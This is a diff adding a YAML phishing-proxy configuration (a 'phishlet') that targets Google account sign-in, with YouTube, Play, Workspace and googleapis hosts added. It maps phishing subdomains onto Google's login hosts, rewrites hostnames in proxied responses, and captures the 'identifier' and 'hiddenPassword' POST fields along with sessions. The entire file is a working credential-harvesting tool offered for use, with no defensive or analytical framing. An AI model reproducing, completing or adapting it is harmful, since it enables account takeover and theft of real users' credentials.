@@ -1,0 +1,75 @@
+name: 'sign_in_google_accounts'
+author: '@panda'
+min_ver: '3.2.0'
+proxy_hosts:
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true}
+  - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: true, is_landing: false}
+  - {phish_sub: 'kidsmanagement-pa.clients6', orig_sub: 'kidsmanagement-pa.clients6', domain: 'google.com', session: 
+      true, is_landing: false}
+  - {phish_sub: 'workspace', orig_sub: 'workspace', domain: 'google.com', session: true, is_landing: false}
+  - {phish_sub: '', orig_sub: '', domain: 'googleapis.com', session: true, is_landing: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'googleapis.com', session: true, is_landing: false}
+  - {phish_sub: 'kidsmanagement-pa', orig_sub: 'kidsmanagement-pa', domain: 'googleapis.com', session: true, is_landing: 
+      false}
+  - {phish_sub: '', orig_sub: '', domain: 'youtube.com', session: true, is_landing: false}
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'youtube.com', session: true, is_landing: false}
+sub_filters:
+  - {triggers_on: 'accounts.google.com', orig_sub: 'play', domain: 'google.com', search: 'play.google.com', replace: 'play.google.com',
+    mimes: [text/html, application/json, application/javascript, text/javascript]}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'play', domain: 'google.com', search: 'play%2Egoogle%2Ecom', replace: 'play%2Egoogle%2Ecom',
+    mimes: [text/html, application/json, application/javascript, text/javascript]}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'kidsmanagement-pa.clients6', domain: 'google.com', search: 'kidsmanagement-pa.clients6.google.com',
+    replace: 'kidsmanagement-pa.clients6.google.com', mimes: [text/html, application/json, application/javascript, 
+          text/javascript]}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'kidsmanagement-pa.clients6', domain: 'google.com', search: 'kidsmanagement-pa%2Eclients6%2Egoogle%2Ecom',
+    replace: 'kidsmanagement-pa%2Eclients6%2Egoogle%2Ecom', mimes: [text/html, application/json, application/javascript, 
+          text/javascript]}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'workspace', domain: 'google.com', search: 'workspace.google.com', 
+      replace: 'workspace.google.com', mimes: [text/html, application/json, application/javascript, text/javascript]}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'workspace', domain: 'google.com', search: 'workspace%2Egoogle%2Ecom',
+    replace: 'workspace%2Egoogle%2Ecom', mimes: [text/html, application/json, application/javascript, text/javascript]}
+  - {triggers_on: 'accounts.google.com', orig_sub: '', domain: 'googleapis.com', search: 'googleapis.com', replace: 'googleapis.com',
+    mimes: [text/html, application/json, application/javascript, text/javascript]}
+  - {triggers_on: 'accounts.google.com', orig_sub: '', domain: 'googleapis.com', search: 'googleapis%2Ecom', replace: 'googleapis%2Ecom',
+    mimes: [text/html, application/json, application/javascript, text/javascript]}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'www', domain: 'googleapis.com', search: 'www.googleapis.com', 
+      replace: 'www.googleapis.com', mimes: [text/html, application/json, application/javascript, text/javascript]}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'www', domain: 'googleapis.com', search: 'www%2Egoogleapis%2Ecom', 
+      replace: 'www%2Egoogleapis%2Ecom', mimes: [text/html, application/json, application/javascript, text/javascript]}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'kidsmanagement-pa', domain: 'googleapis.com', search: 'kidsmanagement-pa.googleapis.com',
+    replace: 'kidsmanagement-pa.googleapis.com', mimes: [text/html, application/json, application/javascript, 
+          text/javascript]}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'kidsmanagement-pa', domain: 'googleapis.com', search: 'kidsmanagement-pa%2Egoogleapis%2Ecom',
+    replace: 'kidsmanagement-pa%2Egoogleapis%2Ecom', mimes: [text/html, application/json, application/javascript, 
+          text/javascript]}
+  - {triggers_on: 'accounts.google.com', orig_sub: '', domain: 'youtube.com', search: 'youtube.com', replace: 'youtube.com',
+    mimes: [text/html, application/json, application/javascript, text/javascript]}
+  - {triggers_on: 'accounts.google.com', orig_sub: '', domain: 'youtube.com', search: 'youtube%2Ecom', replace: 'youtube%2Ecom',
+    mimes: [text/html, application/json, application/javascript, text/javascript]}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'youtube.com', search: 'accounts.youtube.com', 
+      replace: 'accounts.youtube.com', mimes: [text/html, application/json, application/javascript, text/javascript]}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'youtube.com', search: 'accounts%2Eyoutube%2Ecom',
+    replace: 'accounts%2Eyoutube%2Ecom', mimes: [text/html, application/json, application/javascript, text/javascript]}
+auth_tokens: []
+credentials:
+  username:
+    key: 'identifier'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'hiddenPassword'
+    search: '(.*)'
+    type: 'post'
+auth_urls:
+  - '/accounts/CheckConnection'
+  - '/ServiceLogin'
+  - '/signin/challenge'
+login:
+  domain: 'accounts.google.com'
+  path: '/v3/signin/identifier'
+force_post:
+  - path: '/v3/signin/identifier'
+    search:
+      - {key: 'identifier', search: '(.*)'}
+      - {key: 'hiddenPassword', search: '(.*)'}
+    type: 'post'
